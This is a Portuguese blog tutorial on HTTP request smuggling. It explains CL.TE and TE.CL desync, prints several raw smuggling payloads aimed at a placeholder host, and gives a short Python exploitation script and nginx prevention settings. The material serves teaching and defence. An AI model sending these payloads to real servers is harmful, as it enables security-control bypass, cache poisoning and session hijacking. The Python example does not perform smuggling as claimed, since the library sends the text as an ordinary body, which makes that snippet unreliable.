---
title: HTTP Request Smuggling - Uma Vulnerabilidade Crítica em Aplicações Web
published: 2025-09-23
description: Entenda como funciona o HTTP Request Smuggling, uma das vulnerabilidades mais perigosas em aplicações web modernas.
tags: [Security, HTTP, Web Security]
category: Security
draft: false
---

# HTTP Request Smuggling: A Vulnerabilidade Invisível

HTTP Request Smuggling é uma técnica de ataque que explora inconsistências na forma como servidores front-end e back-end processam requisições HTTP. Esta vulnerabilidade pode levar a bypass de controles de segurança, cache poisoning e até mesmo execução remota de código.

## Como Funciona

O ataque se baseia na diferença de interpretação entre dois servidores sobre onde uma requisição HTTP termina e outra começa. Isso acontece principalmente devido a duas formas diferentes de determinar o tamanho do corpo da requisição:

### Content-Length vs Transfer-Encoding

```http
POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

## Tipos de Request Smuggling

### CL.TE (Content-Length.Transfer-Encoding)
O servidor front-end usa Content-Length, o back-end usa Transfer-Encoding:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

### TE.CL (Transfer-Encoding.Content-Length)
O servidor front-end usa Transfer-Encoding, o back-end usa Content-Length:

```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```

## Impactos da Vulnerabilidade

- **Bypass de controles de segurança**: WAFs e filtros podem ser contornados
- **Cache poisoning**: Manipulação de respostas em cache
- **Session hijacking**: Roubo de sessões de outros usuários
- **Request routing**: Redirecionamento malicioso de requisições

## Exemplo Prático de Exploração

```python
import requests

# Payload para CL.TE
payload = """POST /admin HTTP/1.1
Host: vulnerable-site.com
Content-Length: 15
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-site.com
"""

response = requests.post('http://vulnerable-site.com', data=payload)
```

## Detecção e Prevenção

### Detecção
- Use ferramentas como Burp Suite com extensões específicas
- Monitore logs para requisições anômalas
- Implemente testes automatizados

### Prevenção
```nginx
# Configuração Nginx
proxy_http_version 1.1;
proxy_set_header Connection "";
proxy_request_buffering on;
```

- **Normalize requisições**: Configure proxies para usar apenas um método
- **Validação rigorosa**: Rejeite requisições com headers conflitantes
- **Atualizações**: Mantenha servidores sempre atualizados

## Ferramentas de Teste

- **Burp Suite**: Scanner automático e manual
- **HTTP Request Smuggler**: Extensão específica
- **Smuggler.py**: Ferramenta Python para testes

## Conclusão

HTTP Request Smuggling representa uma das vulnerabilidades mais sofisticadas e perigosas em aplicações web modernas. A prevenção efetiva requer uma compreensão profunda de como diferentes servidores processam requisições HTTP e a implementação de controles rigorosos em toda a infraestrutura.

A detecção precoce e a correção adequada são essenciais para manter a segurança de aplicações web em ambientes de produção.
